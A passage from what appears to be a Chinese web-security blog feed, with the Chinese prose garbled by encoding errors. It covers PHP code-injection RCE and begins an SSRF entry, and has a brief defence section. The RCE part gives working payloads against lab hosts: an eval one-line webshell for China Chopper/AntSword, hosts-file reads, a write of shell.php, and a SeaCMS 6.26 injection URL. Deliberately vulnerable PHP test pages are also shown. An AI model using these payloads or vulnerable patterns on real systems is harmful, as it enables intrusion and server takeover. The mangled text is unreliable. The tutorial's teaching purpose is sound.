src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.26.41.png" style="zoom:30%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.34.55.png" style="zoom:55%;"><p>âš ï¸ï¼šä¸èƒ½è°ƒç”¨evalï¼Œevalå±äºè¯­è¨€ç»“æ„ä¸æ˜¯å‡½æ•°ã€‚</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.35.31.png" style="zoom:75%;"></blockquote><h2 id="2-5-åŠ¨æ€å‡½æ•°-a-b"><a href="#2-5-åŠ¨æ€å‡½æ•°-a-b" class="headerlink" title="2.5 åŠ¨æ€å‡½æ•°$a($b)"></a>2.5 åŠ¨æ€å‡½æ•°$a($b)</h2><p>ç”±äºPHPçš„ç‰¹æ€§åŸå› ï¼ŒPHPçš„å‡½æ•°æ”¯æŒç›´æ¥ç”±æ‹¼æ¥çš„æ–¹å¼è°ƒç”¨ï¼Œè¿™ç›´æ¥å¯¼è‡´äº†PHPåœ¨å®‰å…¨ä¸Šçš„æ§åˆ¶åˆåŠ å¤§äº†éš¾åº¦ã€‚ä¸å°‘çŸ¥åç¨‹åºä¸­ä¹Ÿç”¨åˆ°äº†åŠ¨æ€å‡½æ•°çš„å†™æ³•ï¼Œè¿™ç§å†™æ³•è·Ÿä½¿ç”¨call_user_func()çš„åˆè¡·ä¸€æ ·ï¼Œç”¨æ¥æ›´åŠ æ–¹ä¾¿åœ°è°ƒç”¨å‡½æ•°ï¼Œä½†æ˜¯ä¸€æ—¦è¿‡æ»¤ä¸ä¸¥æ ¼å°±ä¼šé€ æˆä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?a=assert&amp;amp; b=phpinfo()"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æäº¤å‚æ•°[?a=assert&amp;b=phpinfo()]</p><blockquote><h4 id="PHP-åŠ¨æ€å‡½æ•°RCEç¤ºä¾‹ï¼š"><a href="#PHP-åŠ¨æ€å‡½æ•°RCEç¤ºä¾‹ï¼š" class="headerlink" title="PHP åŠ¨æ€å‡½æ•°RCEç¤ºä¾‹ï¼š"></a>PHP åŠ¨æ€å‡½æ•°RCEç¤ºä¾‹ï¼š</h4><p>C:\phpstudy\WWW\code-i\dths.php</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.43.55.png" style="zoom:45%;"><p>evalä¸èƒ½ç”¨ã€‚</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.44.15.png" style="zoom:75%;"></blockquote><h1 id="ä¸‰ã€æ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ¼æ´åˆ©ç”¨</h1><h2 id="3-1-ç›´æ¥è·å–shell"><a href="#3-1-ç›´æ¥è·å–shell" class="headerlink" title="3.1 ç›´æ¥è·å–shell"></a>3.1 ç›´æ¥è·å–shell</h2><p>æäº¤å‚æ•°[?code=@eval($_POST[123.com]);], å³å¯æ„æˆä¸€å¥è¯æœ¨é©¬ï¼Œå¯†ç ä¸º[123.com]ã€‚</p><p>å¯ä»¥ä½¿ç”¨èœåˆ€/èšå‰‘è¿æ¥ã€‚[?code=@eval($_REQUEST[123.com]);]</p><blockquote><h4 id="EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´"><a href="#EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´" class="headerlink" title="EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´"></a>EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´</h4><p>æ¼æ´æ¢æµ‹ï¼š</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%885.14.32.png" style="zoom:55%;"><p>æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼š</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%885.15.27.png" style="zoom:55%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/code-i/assert.php?code<span class="token operator">=</span>@eval<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%885.22.47.png" style="zoom:50%;"><p>ç”¨èšå‰‘è¿æ¥ã€‚ç‚¹å‡»æ·»åŠ ã€‚</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%885.24.20.png" style="zoom:50%;"><p>æˆåŠŸgetshellã€‚</p></blockquote><h2 id="3-2-è·å–å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„"><a href="#3-2-è·å–å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„" class="headerlink" title="3.2 è·å–å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„"></a>3.2 è·å–å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</h2><p><code>__FILE__ </code>æ˜¯PHPé¢„å®šä¹‰å¸¸é‡ï¼Œå…¶å«ä¹‰å½“å‰æ–‡ä»¶çš„è·¯å¾„ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?code<span class="token operator">=</span>print<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>EX:é€šè¿‡RCEè·å–å¥å¯¹è·¯å¾„</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%887.45.48.png" style="zoom:45%;"></blockquote><h2 id="3-3-è¯»æ–‡ä»¶"><a href="#3-3-è¯»æ–‡ä»¶" class="headerlink" title="3.3 è¯»æ–‡ä»¶"></a>3.3 è¯»æ–‡ä»¶</h2><p>åˆ©ç”¨file_get_contents() å‡½æ•°è¯»å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ï¼Œå‰ææ˜¯çŸ¥é“ç›®æ ‡æ–‡ä»¶è·¯å¾„å’Œè¯»å–æƒé™ã€‚</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?code<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token string">'c:\windows\system32\drivers\hosts'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶"><a href="#EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶" class="headerlink" title="EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶"></a>EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">code</span><span class="token operator">=</span>var_dump<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span>%27c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>hosts%27<span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%887.57.47.png" style="zoom:75%;"></blockquote><h2 id="3-4-å†™æ–‡ä»¶"><a href="#3-4-å†™æ–‡ä»¶" class="headerlink" title="3.4 å†™æ–‡ä»¶"></a>3.4 å†™æ–‡ä»¶</h2><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨file_put_contents()å‡½æ•°ï¼Œå†™å…¥æ–‡ä»¶ã€‚å‰ææ˜¯çŸ¥é“å¯å†™ç›®å½•ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?code<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>file_put_contents<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>,<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>?code<span class="token operator">=</span>file_put_contents<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>,<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤æ—¶å¯ä»¥å€ŸåŠ©äºhackbaré€šè¿‡postæ–¹å¼æäº¤å‚æ•°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">1</span><span class="token operator">=</span>shell.php<span class="token operator">&amp;</span><span class="token assign-left variable">2</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³å¯åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶shell.php å†…å®¹æ˜¯<code> &lt;?php phpinfo()?&gt;</code>ã€‚</p><blockquote><h4 id="EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶å†™æ–‡ä»¶"><a href="#EX-åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶å†™æ–‡ä»¶" class="headerlink" title="EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶å†™æ–‡ä»¶"></a>EX:åˆ©ç”¨PHPä»£ç æ³¨å…¥æ¼æ´è¯»æ–‡ä»¶å†™æ–‡ä»¶</h4><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.04.51.png" style="zoom:35%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.06.46.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.07.18.png" style="zoom:50%;"></blockquote><h1 id="å››ã€é˜²å¾¡æ–¹æ³•"><a href="#å››ã€é˜²å¾¡æ–¹æ³•" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h1><p>1.å°½é‡ä¸è¦ä½¿ç”¨evalç­‰å‡½æ•°</p><p>2.å¦‚æœä½¿ç”¨çš„è¯ä¸€å®šè¦è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤</p><p>3.preg_ replace æ”¾å¼ƒä½¿ç”¨/eä¿®é¥°ç¬¦</p><p>4.ä¿®æ”¹php.inié…ç½®æ–‡ä»¶ï¼Œç¦ç”¨ç›¸å…³å‡½æ•°ã€‚</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.17.16.png" style="zoom:75%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php">disable_functions<span class="token operator">=</span>assert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹ä¹‹åé‡å¯æœåŠ¡ã€‚</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.18.34.png" style="zoom:75%;"><p>å¯ä»¥çœ‹åˆ°assert()å‡½æ•°å·²ç»è¢«ç¦ç”¨äº†ã€‚</p><p>âš ï¸ï¼ševalä¸æ˜¯å‡½æ•°ï¼Œä¸èƒ½åœ¨è¿™é‡Œç¦ç”¨ã€‚</p><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><h2 id="1ï¼‰Seacmsv6-26-PHPä»£ç æ³¨å…¥æ¼æ´"><a href="#1ï¼‰Seacmsv6-26-PHPä»£ç æ³¨å…¥æ¼æ´" class="headerlink" title="1ï¼‰Seacmsv6.26 PHPä»£ç æ³¨å…¥æ¼æ´"></a>1ï¼‰Seacmsv6.26 PHPä»£ç æ³¨å…¥æ¼æ´</h2><p> [?searchtype=5&amp;tid=&amp;area=phpinfo( ) ]</p><p>æ­¤å¤„æƒ³è±¡ç©ºé—´éå¸¸å¤§ã€‚</p><p>6.55 6.53 6.54 éƒ½å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><blockquote><h4 id="EXï¼šæµ·æ´‹CMS6-26-ä»£ç æ³¨å…¥æ¼æ´"><a href="#EXï¼šæµ·æ´‹CMS6-26-ä»£ç æ³¨å…¥æ¼æ´" class="headerlink" title="EXï¼šæµ·æ´‹CMS6.26 ä»£ç æ³¨å…¥æ¼æ´"></a>EXï¼šæµ·æ´‹CMS6.26 ä»£ç æ³¨å…¥æ¼æ´</h4><p>1ã€æ­å»ºç½‘ç«™</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.31.24.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.33.50.png" style="zoom:45%;"><p>âš ï¸ï¼šæ•°æ®åº“å¯†ç  è®¾ç½®æˆroot</p><p>2ã€æ¼æ´éªŒè¯</p><p> [search.php?searchtype=5&amp;tid=&amp;area=phpinfo( ) ]</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%888.37.13.png" style="zoom:75%;"></blockquote>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> RCE </tag>
            
            <tag> è¿œç¨‹ä»£ç æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœåŠ¡ç«¯è·¨ç«™è¯·æ±‚ä¼ªé€ </title>
      <link href="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/"/>
      <url>/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€SSRF-æ¦‚è¿°"><a href="#ä¸€ã€SSRF-æ¦‚è¿°" class="headerlink" title="ä¸€ã€SSRF æ¦‚è¿°"></a>ä¸€ã€SSRF æ¦‚è¿°</h1><p>SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨æœåŠ¡å™¨ç«¯çš„åº”ç”¨ç¨‹åºåŠŸèƒ½ï¼Œè¯±ä½¿æœåŠ¡å™¨å‘æ”»å‡»è€…æŒ‡å®šçš„å†…éƒ¨æˆ–å¤–éƒ¨ç›®æ ‡å‘èµ·è¯·æ±‚ï¼Œä»è€Œç»•è¿‡æœåŠ¡å™¨çš„è®¿é—®æ§åˆ¶é™åˆ¶ã€‚è¿™ç§æ¼æ´é€šå¸¸å‡ºç°åœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­ï¼Œå½“åº”ç”¨ç¨‹åºåœ¨æœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯çš„æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·å¯æ§çš„å‚æ•°ä½œä¸ºè¯·æ±‚ç›®æ ‡åœ°å€æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è®¿é—®å†…ç½‘æœåŠ¡ã€æ‰«æå†…ç½‘ç«¯å£ã€æ”»å‡»å…¶ä»–ç³»ç»Ÿæˆ–è¿›è¡Œæ•°æ®æ³„éœ²ç­‰æ¶æ„è¡Œä¸ºï¼Œä¸¥é‡å¨èƒæœåŠ¡å™¨å’Œå†…ç½‘çš„å®‰å…¨æ€§ã€‚</p><h2 id="1-1-å¯¹æ¯”CSRF"><a href="#1-1-å¯¹æ¯”CSRF" class="headerlink" title="1.1 å¯¹æ¯”CSRF"></a>1.1 å¯¹æ¯”CSRF</h2><p>CSRFâ€”â€”å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œå¼ºåˆ¶å®¢æˆ·ç«¯å‘é€æ”»å‡»è€…çš„è¯·æ±‚ã€‚</p><p>SSRFâ€”â€”å‘ç”Ÿåœ¨æœåŠ¡ç«¯ï¼Œå¼ºåˆ¶æœåŠ¡å™¨å‘é€æ”»å‡»è€…çš„è¯·æ±‚ã€‚</p><h2 id="1-2-SSRFåœºæ™¯"><a href="#1-2-SSRFåœºæ™¯" class="headerlink" title="1.2 SSRFåœºæ™¯"></a>1.2 SSRFåœºæ™¯</h2><p> äº’è”ç½‘ä¸Šçš„å¾ˆå¤šWeb åº”ç”¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨ï¼ˆä¹Ÿå¯ä»¥æ˜¯æœ¬åœ°ï¼‰è·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼ŒWeb åº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ã€æ–‡ä»¶èµ„æºï¼ˆä¸‹è½½æˆ–è¯»å–ï¼‰ã€‚å¦‚ç™¾åº¦è¯†å›¾ç­‰ã€‚</p><p> ç”¨æˆ·å¯ä»¥ä»æœ¬åœ°æˆ–è€…URL çš„æ–¹å¼è·å–å›¾ç‰‡èµ„æºï¼Œäº¤ç»™ç™¾åº¦è¯†å›¾å¤„ç†ã€‚å¦‚æœæäº¤çš„æ˜¯URL åœ°å€ï¼Œè¯¥åº”ç”¨å°±ä¼šé€šè¿‡URL çš„æ–¹å¼è·å–å›¾ç‰‡èµ„æºã€‚å¦‚æœWeb åº”ç”¨å¼€æ”¾äº†ç±»ä¼¼äºç™¾åº¦è¯†å›¾è¿™æ ·çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·æä¾›çš„URLå’Œè¿œç«¯æœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯æ²¡æœ‰è¿›è¡Œåˆé€‚çš„éªŒè¯æˆ–è€…è¿‡æ»¤ï¼Œå°±å¯èƒ½å­˜åœ¨â€œè¯·æ±‚ä¼ªé€ â€çš„ç¼ºé™·ã€‚</p><p>è¯·æ±‚ä¼ªé€ ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æ”»å‡»è€…ä¼ªé€ æ­£å¸¸çš„è¯·æ±‚ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œæ˜¯å¸¸è§çš„Web å®‰å…¨æ¼æ´ä¹‹ä¸€ã€‚å¦‚æœâ€œè¯·æ±‚ä¼ªé€ â€å‘ç”Ÿåœ¨æœåŠ¡å™¨ç«¯ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¼æ´å°±å«åšâ€œæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ â€ï¼Œè‹±æ–‡åä¸ºServer-Side Request Forgery,ç®€ç§°SSRFã€‚</p><p> SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§æ”»å‡»è€…å‘èµ·çš„ä¼ªé€ ç”±æœåŠ¡å™¨ç«¯å‘å‡ºè¯·æ±‚çš„ä¸€ç§æ”»å‡»ï¼Œä¹Ÿæ˜¯å¸¸è§çš„Web å®‰å…¨æ¼æ´ï¼ˆç¼ºé™·æˆ–è€…é£é™©ï¼‰ä¹‹ä¸€ã€‚</p><h2 id="1-3-å±å®³"><a href="#1-3-å±å®³" class="headerlink" title="1.3 å±å®³"></a>1.3 å±å®³</h2><ul><li>ç«¯å£æ‰«æ</li><li>å†…ç½‘Web åº”ç”¨æŒ‡çº¹è¯†åˆ«</li><li>æ”»å‡»å†…ç½‘Web åº”ç”¨</li><li>è¯»å–æœ¬åœ°æ–‡ä»¶</li></ul><h1 id="äºŒã€SSRF-å¸¸è§ä»£ç å®ç°"><a href="#äºŒã€SSRF-å¸¸è§ä»£ç å®ç°" class="headerlink" title="äºŒã€SSRF å¸¸è§ä»£ç å®ç°"></a>äºŒã€SSRF å¸¸è§ä»£ç å®ç°</h1><p>åœ¨æœåŠ¡å™¨ç«¯å®ç°é€šè¿‡URL ä»æœåŠ¡å™¨ï¼ˆå¤–éƒ¨æˆ–è€…å†…éƒ¨ï¼‰è·å–èµ„æºåŠŸèƒ½çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ­¤å¤„ä½¿ç”¨PHP è¯­è¨€å’Œcurl æ‰©å±•å®ç°è¯¥åŠŸèƒ½ã€‚</p><p>é€šè¿‡phpinfo() å‡½æ•°æŸ¥çœ‹å¯¹curl æ‰©å±•çš„æ”¯æŒï¼Œç°åœ¨å¤§éƒ¨åˆ†wamp å¥—ä»¶å‡æ”¯æŒcurl æ‰©å±•ã€‚</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%889.27.17.png" style="zoom:50%;"><p>æœåŠ¡ç«¯ä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span><span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FILE</span><span class="token punctuation">,</span> <span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?url=[url]"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ä»¥ä¸Šä»£ç ä¿å­˜ä¸º.php æ–‡ä»¶ï¼Œè¯¥æ®µä»£ç å®ç°ä»æœåŠ¡å™¨è·å–èµ„æºçš„åŸºæœ¬åŠŸèƒ½ï¼Œæäº¤å‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?url<span class="token operator">=</span>http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¡µé¢å°±ä¼šè½½å…¥ç™¾åº¦é¦–é¡µçš„èµ„æºã€‚åŒæ—¶ï¼Œè·å–èµ„æºæ–‡ä»¶ä¼šä¿å­˜åœ¨[./curled]ä¸­ï¼Œå¹¶ä»¥å‘èµ·è¯·æ±‚æ—¶é—´æˆ³å‘½åã€‚</p><blockquote><h4 id="EXï¼šåŠŸèƒ½éªŒè¯"><a href="#EXï¼šåŠŸèƒ½éªŒè¯" class="headerlink" title="EXï¼šåŠŸèƒ½éªŒè¯"></a>EXï¼šåŠŸèƒ½éªŒè¯</h4><p>ä½¿ç”¨httpsæœ‰é—®é¢˜ï¼Œå› 